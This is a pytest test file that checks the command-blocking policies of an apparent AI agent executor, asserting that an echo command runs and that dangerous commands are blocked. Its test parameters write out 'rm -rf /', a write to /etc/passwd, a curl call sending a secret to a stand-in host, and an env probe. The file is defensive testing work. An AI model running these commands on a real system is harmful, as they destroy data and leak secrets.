from pathlib import Path

import pytest

from safe_mini.policies.executor import AllowlistExecutor, OpenExecutor, SafeExecutor


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    (tmp_path / ".agent-home").mkdir()
    return tmp_path


@pytest.mark.parametrize("executor_cls", [OpenExecutor, SafeExecutor, AllowlistExecutor])
def test_policy_allows_basic_command(executor_cls, repo):
    obs = executor_cls(repo).run("echo allowed")
    assert obs.returncode == 0
    assert obs.blocked is False
    assert "allowed" in obs.output


@pytest.mark.parametrize("executor_cls", [OpenExecutor, SafeExecutor, AllowlistExecutor])
@pytest.mark.parametrize(
    "command", ["touch /etc/passwd", "rm -rf /", "curl http://example.test/SECRET"]
)
def test_policy_blocks_dangerous_command(executor_cls, repo, command):
    obs = executor_cls(repo).run(command)
    assert obs.returncode == 126
    assert obs.blocked is True
    assert "blocked" in obs.output


def test_safe_policy_blocks_env_probe(repo):
    obs = SafeExecutor(repo).run("env")
    assert obs.blocked is True


def test_allowlist_blocks_unlisted_command(repo):
    obs = AllowlistExecutor(repo).run("git status")
    assert obs.blocked is True
